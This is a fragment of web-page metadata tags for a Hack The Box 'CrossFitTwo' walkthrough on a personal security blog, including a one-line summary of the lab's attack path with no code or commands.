key."}],["$","meta","14",{"property":"og:url","content":"https://cyberkareem.com/writing/hackthebox-crossfittwo-walkthrough/"}],["$","meta","15",{"property":"og:site_name","content":"CyberKareem"}],["$","meta","16",{"property":"og:locale","content":"en_US"}],["$","meta","17",{"property":"og:image","content":"https://cyberkareem.com/writing/covers/hackthebox-crossfittwo-walkthrough.webp"}],["$","meta","18",{"property":"og:image:width","content":"300"}],["$","meta","19",{"property":"og:image:height","content":"300"}],["$","meta","20",{"property":"og:image:alt","content":"Hack The Box CrossFitTwo machine avatar"}],["$","meta","21",{"property":"og:type","content":"article"}],["$","meta","22",{"property":"article:published_time","content":"2026-06-11T15:37:33.000Z"}],["$","meta","23",{"property":"article:modified_time","content":"2026-07-12T00:00:00.000Z"}],["$","meta","24",{"property":"article:author","content":"https://cyberkareem.com"}],["$","meta","25",{"name":"twitter:card","content":"summary_large_image"}],["$","meta","26",{"name":"twitter:creator","content":"@CyberKareem"}],["$","meta","27",{"name":"twitter:title","content":"Hack The Box: CrossFitTwo Walkthrough"}],["$","meta","28",{"name":"twitter:description","content":"js module hijacking and a SUID file reader expose YubiKey material and a backed-up root SSH key."}],["$","meta","29",{"name":"twitter:image","content":"https://cyberkareem.com/writing/covers/hackthebox-crossfittwo-walkthrough.webp"}],["$","link","30",{"rel":"icon","href":"/icon.svg","type":"image/svg+xml"}],["$","link","31",{"rel":"icon","href":"/icon-192.png","type":"image/png","sizes":"192x192"}],["$","link","32",{"rel":"icon","href":"/icon-512.png","type":"image/png","sizes":"512x512"}],["$","link","33",{"rel":"apple-touch-icon","href":"/apple-touch-icon.png","sizes":"180x180"}],["$","$L30","34",{}]]
